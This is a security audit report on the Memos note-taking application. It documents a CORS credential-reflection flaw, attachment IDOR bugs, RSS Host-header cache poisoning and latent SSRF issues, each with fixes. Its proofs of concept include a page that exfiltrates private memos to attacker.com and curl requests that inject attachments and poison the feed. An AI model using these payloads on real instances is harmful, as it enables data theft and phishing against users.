# Memos Security Audit Report

**Date:** 2026-02-25  
**Repository:** usememos/memos  
**Scope:** Full codebase security review (backend Go + frontend React)  

---

## Executive Summary

This report documents security vulnerabilities identified during a comprehensive code audit of the Memos codebase. The audit focused on authentication/authorization, API layer security, data layer integrity, and HTTP handling patterns.

**Critical Findings: 0** | **High Findings: 1** | **Medium Findings: 3** | **Low Findings: 2**

---

## Vulnerability 1: CORS Misconfiguration — Credential Reflection with Wildcard Origin

**Severity:** HIGH  
**Type:** CWE-942 (Overly Permissive Cross-domain Whitelist)  
**File:** `server/router/api/v1/v1.go`  
**Lines:** 136–143  

### Description

The Connect RPC handler group configures CORS to reflect **any** origin in `Access-Control-Allow-Origin` while simultaneously setting `Access-Control-Allow-Credentials: true`. This violates the CORS specification's security model and allows any website to make authenticated cross-origin requests to the Memos API.

### Vulnerable Code

```go
// server/router/api/v1/v1.go:136-143
corsHandler := middleware.CORSWithConfig(middleware.CORSConfig{
    UnsafeAllowOriginFunc: func(_ *echo.Context, origin string) (string, bool, error) {
        return origin, true, nil  // Reflects ANY origin
    },
    AllowMethods:     []string{http.MethodGet, http.MethodPost, http.MethodOptions},
    AllowHeaders:     []string{"*"},
    AllowCredentials: true,  // Allows cookies/credentials
})
```

### Impact

- **Cross-Site Data Theft:** Any malicious website a user visits can silently make authenticated API calls to the victim's Memos instance, reading private memos, user data, and settings.
- **Cross-Site State Mutation:** The attacker's website can create, update, or delete memos, attachments, and settings on behalf of the victim.
- **Increased severity in HTTP deployments:** When Memos is deployed without HTTPS, the `SameSite=Lax` cookie attribute provides weaker protection, making this vulnerability fully exploitable.

### Mitigation

The `SameSite=Lax` attribute on the refresh token cookie partially mitigates this for HTTPS deployments (cross-origin `POST` via JavaScript won't carry the cookie). However:
1. HTTP deployments have weaker SameSite enforcement
2. If access tokens are obtained through any other mechanism, all API endpoints become accessible
3. The CORS configuration explicitly uses `UnsafeAllowOriginFunc` — the name itself indicates this is known-unsafe

### POC

```html
<!-- Hosted on attacker.com -->
<html>
<body>
<h1>CORS Credential Reflection PoC</h1>
<script>
// Target: victim's Memos instance
const MEMOS_URL = 'https://memos.victim.example';

// This request will include Access-Control-Allow-Origin: https://attacker.com
// and Access-Control-Allow-Credentials: true in the response
// Browsers will allow reading the response from attacker.com

// Step 1: Attempt to read private memos via Connect RPC
fetch(MEMOS_URL + '/memos.api.v1.MemoService/ListMemos', {
    method: 'POST',
    credentials: 'include',  // Include cookies
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        pageSize: 50,
        filter: ''
    })
})
.then(r => r.json())
.then(data => {
    console.log('Stolen memos:', data);
    // Exfiltrate to attacker's server
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});

// Step 2: Read user profile/settings
fetch(MEMOS_URL + '/memos.api.v1.UserService/GetUser', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ name: 'users/me' })
})
.then(r => r.json())
.then(data => console.log('User info:', data));
</script>
</body>
</html>
```

### Verification Steps

1. Deploy Memos instance at `http://localhost:8081` (HTTP mode for full exploitability)
2. Login to the Memos instance and create some private memos
3. Host the PoC HTML on a different origin (e.g., `http://localhost:9090`)
4. Visit the PoC page in the same browser
5. Observe the CORS response headers allow the cross-origin request with credentials
6. Check browser console for stolen data

### Recommended Fix

```go
// Replace UnsafeAllowOriginFunc with explicit origin validation
corsHandler := middleware.CORSWithConfig(middleware.CORSConfig{
    AllowOriginFunc: func(origin string) (bool, error) {
        // Only allow the configured instance URL or same-origin
        allowedOrigin := s.Profile.InstanceURL
        return origin == allowedOrigin, nil
    },
    AllowMethods:     []string{http.MethodGet, http.MethodPost, http.MethodOptions},
    AllowHeaders:     []string{"Content-Type", "Authorization", "Connect-Protocol-Version"},
    AllowCredentials: true,
})
```

---

## Vulnerability 2: Attachment Injection via Missing Memo Ownership Check (IDOR)

**Severity:** MEDIUM  
**Type:** CWE-639 (Authorization Bypass Through User-Controlled Key)  
**File:** `server/router/api/v1/attachment_service.go`  
**Lines:** 150–163  

### Description

When creating an attachment with a memo reference, the `CreateAttachment` function verifies the memo exists but does **not** verify that the authenticated user is the owner of the target memo. This allows any authenticated user to inject attachments into another user's memo.

### Vulnerable Code

```go
// server/router/api/v1/attachment_service.go:150-163
if request.Attachment.Memo != nil {
    memoUID, err := ExtractMemoUIDFromName(*request.Attachment.Memo)
    if err != nil {
        return nil, status.Errorf(codes.InvalidArgument, "invalid memo name: %v", err)
    }
    memo, err := s.Store.GetMemo(ctx, &store.FindMemo{UID: &memoUID})
    if err != nil {
        return nil, status.Errorf(codes.Internal, "failed to find memo: %v", err)
    }
    if memo == nil {
        return nil, status.Errorf(codes.NotFound, "memo not found: %s", *request.Attachment.Memo)
    }
    // BUG: No ownership check — any user can link their attachment to any memo
    create.MemoID = &memo.ID
}
```

Note that `SetMemoAttachments` (in `memo_attachment_service.go:35`) correctly checks ownership:
```go
if memo.CreatorID != user.ID && !isSuperUser(user) {
    return nil, status.Errorf(codes.PermissionDenied, "permission denied")
}
```

But `CreateAttachment` bypasses this check entirely.

### Impact

- **Content Injection:** An attacker can inject arbitrary file attachments into another user's public or protected memos. These attachments will appear when the memo is viewed.
- **Reputation Damage:** Injected content (e.g., inappropriate images) appears associated with the victim's memo.
- **Data Manipulation:** The injected attachment becomes part of the memo's data and is visible via RSS feeds and API responses.

### POC

```bash
#!/bin/bash
# Prerequisites:
# - Memos instance running at localhost:8081
# - ATTACKER_TOKEN: Access token for attacker's account (User B)
# - VICTIM_MEMO_UID: UID of victim's memo (User A), observable from public memos

MEMOS_URL="http://localhost:8081"
ATTACKER_TOKEN="your-attacker-access-token"
VICTIM_MEMO_UID="victim-memo-uid"  # e.g., from /api/v1/memos listing

# Step 1: Create a malicious attachment linked to victim's memo
# Using the gRPC-Gateway REST API
curl -X POST "${MEMOS_URL}/api/v1/attachments" \
  -H "Authorization: Bearer ${ATTACKER_TOKEN}" \
  -H "Content-Type: application/json" \
  -d "{
    \"attachment\": {
      \"filename\": \"injected.txt\",
      \"type\": \"text/plain\",
      \"content\": \"$(echo -n 'Injected content by attacker' | base64)\",
      \"memo\": \"memos/${VICTIM_MEMO_UID}\"
    }
  }"

# Step 2: Verify the attachment appears in victim's memo
curl -X POST "${MEMOS_URL}/api/v1/memos/${VICTIM_MEMO_UID}:listAttachments" \
  -H "Content-Type: application/json"

# The attacker's attachment now appears in the victim's memo
```

### Verification Steps

1. Create two user accounts (User A and User B)
2. User A creates a public memo, note its UID
3. User B creates an attachment specifying User A's memo UID as the `memo` field
4. Verify the attachment now appears in User A's memo attachments

### Recommended Fix

```go
// Add ownership check after memo lookup in CreateAttachment
if request.Attachment.Memo != nil {
    // ... existing memo lookup code ...
    
    // Add: Verify user owns the target memo
    if memo.CreatorID != user.ID && !isSuperUser(user) {
        return nil, status.Errorf(codes.PermissionDenied, "cannot attach to another user's memo")
    }
    create.MemoID = &memo.ID
}
```

---

## Vulnerability 3: Cross-User Attachment Linking in SetMemoAttachments

**Severity:** MEDIUM  
**Type:** CWE-639 (Authorization Bypass Through User-Controlled Key)  
**File:** `server/router/api/v1/memo_attachment_service.go`  
**Lines:** 70–89  

### Description

The `SetMemoAttachments` function correctly checks that the current user owns the target memo (line 35). However, when linking attachments to the memo, it does **not** verify that the attachment belongs to the current user. This allows a user to "steal" another user's attachment by linking it to their own memo.

### Vulnerable Code

```go
// server/router/api/v1/memo_attachment_service.go:70-89
for index, attachment := range request.Attachments {
    attachmentUID, err := ExtractAttachmentUIDFromName(attachment.Name)
    // ...
    tempAttachment, err := s.Store.GetAttachment(ctx, &store.FindAttachment{UID: &attachmentUID})
    // ...
    if tempAttachment == nil {
        return nil, status.Errorf(codes.NotFound, "attachment not found: %s", attachmentUID)
    }
    // BUG: No check that tempAttachment.CreatorID == user.ID
    // Any attachment UID can be linked to the user's memo
    updatedTs := time.Now().Unix() + int64(index)
    if err := s.Store.UpdateAttachment(ctx, &store.UpdateAttachment{
        ID:        tempAttachment.ID,
        MemoID:    &memo.ID,
        UpdatedTs: &updatedTs,
    }); err != nil {
        return nil, status.Errorf(codes.Internal, "failed to update attachment: %v", err)
    }
}
```

### Impact

- **Attachment Theft:** An attacker can link another user's private (unlinked) attachment to their own memo, making it publicly accessible.
- **Privacy Violation:** Unlinked attachments are meant to be private to their creator. This bypass exposes them.
- **Authorization Bypass:** The access control model for unlinked attachments (creator-only) is effectively broken.

### POC

```bash
#!/bin/bash
MEMOS_URL="http://localhost:8081"
ATTACKER_TOKEN="your-attacker-access-token"
ATTACKER_MEMO_UID="attacker-memo-uid"
VICTIM_ATTACHMENT_UID="victim-attachment-uid"  # Must be guessed/enumerated

# Link victim's attachment to attacker's memo
curl -X POST "${MEMOS_URL}/memos.api.v1.MemoService/UpdateMemo" \
  -H "Authorization: Bearer ${ATTACKER_TOKEN}" \
  -H "Content-Type: application/json" \
  -d "{
    \"memo\": {
      \"name\": \"memos/${ATTACKER_MEMO_UID}\",
      \"attachments\": [
        { \"name\": \"attachments/${VICTIM_ATTACHMENT_UID}\" }
      ]
    },
    \"updateMask\": { \"paths\": [\"attachments\"] }
  }"

# The victim's attachment is now associated with the attacker's memo
# and accessible via the attacker's memo visibility settings
```

### Note on Exploitability

This vulnerability requires knowing a victim's attachment UID. Attachment UIDs are generated by `shortuuid.New()` which produces random 22-character strings. Direct brute-force is infeasible. However:
- Attachment UIDs may be exposed in public memo data
- Attachment UIDs appear in file URLs (`/file/attachments/{uid}/{filename}`)
- Browser history, referrer headers, or logs could leak UIDs

### Recommended Fix

```go
// Add ownership check for each attachment
if tempAttachment.CreatorID != user.ID && !isSuperUser(user) {
    return nil, status.Errorf(codes.PermissionDenied, 
        "cannot link attachment %s: not owned by current user", attachmentUID)
}
```

---

## Vulnerability 4: Host Header Injection in RSS Feed Generation

**Severity:** MEDIUM  
**Type:** CWE-644 (Improper Neutralization of HTTP Headers for Scripting Syntax)  
**File:** `server/router/rss/rss.go`  
**Lines:** 98, 148  

### Description

The RSS feed generation uses the raw HTTP `Host` header from the request to construct base URLs for feed items. An attacker can inject a malicious `Host` header to poison the RSS feed cache with URLs pointing to an attacker-controlled domain.

### Vulnerable Code

```go
// server/router/rss/rss.go:98
baseURL := c.Scheme() + "://" + c.Request().Host

// server/router/rss/rss.go:148
baseURL := c.Scheme() + "://" + c.Request().Host
```

The `baseURL` is then used to generate:
- Feed link: `&feeds.Link{Href: baseURL}` (line 168)
- Item links: `baseURL + "/memos/" + memo.UID` (line 243)
- Attachment URLs: `fmt.Sprintf("%s/file/attachments/%s/%s", baseURL, ...)` (line 277)

These generated URLs are **cached** for up to 1 hour (line 25: `defaultCacheDuration = 1 * time.Hour`).

### Impact

- **RSS Cache Poisoning:** An attacker can send a request with `Host: evil.com`, causing the RSS cache to store URLs like `https://evil.com/memos/xyz`. All subsequent users reading the RSS feed will see attacker-controlled URLs for 1 hour.
- **Phishing:** Users clicking RSS feed links are redirected to a phishing site that mirrors the Memos interface.
- **Credential Theft:** The phishing site can present a login page to harvest credentials.

### POC

```bash
#!/bin/bash
MEMOS_URL="http://memos.victim.example:8081"

# Step 1: Poison the RSS cache with attacker's domain
# Send request with forged Host header
curl -s "${MEMOS_URL}/explore/rss.xml" \
  -H "Host: evil-phishing.com" \
  -o /dev/null

# Step 2: Verify cache is poisoned
# Subsequent requests (even with correct Host) serve cached content
curl -s "${MEMOS_URL}/explore/rss.xml" | grep "evil-phishing.com"

# Expected output: URLs in the RSS feed point to evil-phishing.com
# <link>https://evil-phishing.com</link>
# <link>https://evil-phishing.com/memos/abc123</link>
```

### Note on Exploitability

The exploitability depends on the reverse proxy configuration:
- **Direct access (no reverse proxy):** Fully exploitable — HTTP clients can set arbitrary `Host` headers
- **Behind a well-configured reverse proxy (nginx/Caddy):** The proxy typically overwrites the Host header, mitigating this
- **Behind a misconfigured proxy:** Exploitable via `X-Forwarded-Host` or similar headers

The RSS cache amplifies the impact significantly — a single poisoned request affects all users for 1 hour.

### Recommended Fix

```go
// Use configured instance URL instead of Host header
func (s *RSSService) getBaseURL(c *echo.Context) string {
    // Prefer configured instance URL
    if s.Profile.InstanceURL != "" {
        return strings.TrimRight(s.Profile.InstanceURL, "/")
    }
    // Fallback to Host header (for backward compatibility)
    return c.Scheme() + "://" + c.Request().Host
}
```

---

## Vulnerability 5: SSRF in GetImage — Missing Internal IP Validation

**Severity:** LOW (Latent — function not currently called from service layer)  
**Type:** CWE-918 (Server-Side Request Forgery)  
**File:** `plugin/httpgetter/image.go`  
**Lines:** 16–24  

### Description

The `GetImage` function fetches images from user-supplied URLs using `http.Get()` without any SSRF protections. Unlike the companion `GetHTMLMeta` function which validates URLs against internal IP addresses (line 36 of `html_meta.go`), `GetImage` only performs basic URL parsing.

### Vulnerable Code

```go
// plugin/httpgetter/image.go:16-24
func GetImage(urlStr string) (*Image, error) {
    if _, err := url.Parse(urlStr); err != nil {
        return nil, err
    }
    // BUG: No SSRF validation — missing validateURL() call
    // Compare with GetHTMLMeta which calls validateURL() at line 36
    response, err := http.Get(urlStr)  // Fetches ANY URL including internal IPs
    if err != nil {
        return nil, err
    }
    // ...
}
```

Contrast with the protected `GetHTMLMeta`:
```go
// plugin/httpgetter/html_meta.go:35-38
func GetHTMLMeta(urlStr string) (*HTMLMeta, error) {
    if err := validateURL(urlStr); err != nil {  // ✓ SSRF check
        return nil, err
    }
    response, err := httpClient.Get(urlStr)  // Uses safe client with redirect checking
```

### Impact (if function becomes active)

- Access to internal services (cloud metadata at `169.254.169.254`, internal APIs)
- Port scanning of internal network
- Reading local files via `file://` protocol (Go's `http.Get` doesn't support this, but `http://127.0.0.1:port` is accessible)

### Current Status

This function is **not imported or called** anywhere in the service layer. It is a latent vulnerability that becomes exploitable if the function is used in a future feature (e.g., image proxy, link preview with image fetching).

### Recommended Fix

```go
func GetImage(urlStr string) (*Image, error) {
    if err := validateURL(urlStr); err != nil {  // Add SSRF validation
        return nil, err
    }
    response, err := httpClient.Get(urlStr)  // Use safe HTTP client
    // ...
}
```

---

## Vulnerability 6: Unbounded HTTP Response Body in HTML Meta Fetching

**Severity:** LOW (Latent — function not currently called from service layer)  
**Type:** CWE-770 (Allocation of Resources Without Limits)  
**File:** `plugin/httpgetter/html_meta.go`  
**Lines:** 54–56  

### Description

The `GetHTMLMeta` function reads the entire HTTP response body without any size limits. A malicious or compromised URL could return an extremely large response, causing memory exhaustion on the server.

### Vulnerable Code

```go
// plugin/httpgetter/html_meta.go:54-56
// TODO: limit the size of the response body  <-- Acknowledged but unfixed

htmlMeta := extractHTMLMeta(response.Body)  // Reads entire body
```

The same issue exists in `GetImage`:
```go
// plugin/httpgetter/image.go:35
bodyBytes, err := io.ReadAll(response.Body)  // No size limit
```

### Impact (if functions become active)

- **Memory Exhaustion DoS:** An attacker can provide a URL that returns an extremely large response (e.g., `/dev/urandom` endpoint), causing the server to allocate unbounded memory.
- **Service Disruption:** Server OOM kills or significant performance degradation.

### Current Status

Like Vulnerability 5, these functions are not currently called from the service layer. The existing `TODO` comment indicates awareness of this issue.

### Recommended Fix

```go
// Use io.LimitReader to cap response body size
const maxResponseSize = 10 * 1024 * 1024 // 10MB
limitedReader := io.LimitReader(response.Body, maxResponseSize)
htmlMeta := extractHTMLMeta(limitedReader)
```

---

## Additional Observations

### Well-Implemented Security Controls

The following security measures are correctly implemented and deserve recognition:

| Control | Location | Notes |
|---------|----------|-------|
| SQL Injection Prevention | `store/db/sqlite/*.go`, `store/db/mysql/*.go`, `store/db/postgres/*.go` | All queries use parameterized statements consistently |
| Path Traversal Prevention | `attachment_service.go:519-532` | `filepath.IsLocal()` blocks `..` and absolute paths in filenames |
| XSS Prevention (File Serving) | `fileserver/fileserver.go:45-56, 536-544` | Dangerous MIME types converted to `application/octet-stream`; CSP headers applied |
| SSRF Prevention (Webhooks) | `plugin/webhook/validate.go:14-75` | Comprehensive private IP blocking including cloud IMDS |
| SSRF Prevention (HTML Meta) | `plugin/httpgetter/html_meta.go:119-155` | DNS rebinding protection with IP validation |
| EXIF Metadata Stripping | `attachment_service.go:131-144` | Strips GPS/camera metadata from uploaded images |
| Cookie Security | `auth_service.go:369-400` | HttpOnly, SameSite=Lax, Secure (HTTPS) |
| Password Hashing | `user_service.go:163` | bcrypt with default cost |
| Memo Visibility Enforcement | `memo_service.go:303-314` | Proper private/protected visibility checks |
| JWT Token Design | `auth/token.go` | Short-lived access tokens (15 min), proper issuer/audience validation |

### Low-Risk Observations (Not Vulnerabilities)

1. **User Enumeration via Public Endpoints:** `GetUserAvatar`, `GetUserStats`, `SearchUsers` are public (by design for social features). Could allow user enumeration but this is an intended feature.

2. **Custom Timestamp Injection:** `CreateMemo` allows setting `create_time` and `update_time` (lines 68-75 of `memo_service.go`). This is a designed feature for import/migration scenarios, not a vulnerability.

3. **First-User Race Condition:** Theoretical race condition in `CreateUser` where two simultaneous requests could both see `isFirstUser=true` and create two admin accounts. Extremely narrow window, only during initial setup.

---

## Risk Summary

| # | Vulnerability | Severity | CVSS Est. | Status | Exploitable |
|---|--------------|----------|-----------|--------|-------------|
| 1 | CORS Credential Reflection | HIGH | 7.1 | Active | Yes (HTTP) / Partial (HTTPS) |
| 2 | Attachment Injection IDOR | MEDIUM | 5.4 | Active | Yes (requires auth) |
| 3 | Cross-User Attachment Linking | MEDIUM | 4.3 | Active | Yes (requires known UIDs) |
| 4 | Host Header RSS Cache Poisoning | MEDIUM | 5.3 | Active | Depends on deployment |
| 5 | SSRF in GetImage | LOW | 3.1 | Latent | No (function unused) |
| 6 | Unbounded Response Body | LOW | 3.1 | Latent | No (function unused) |
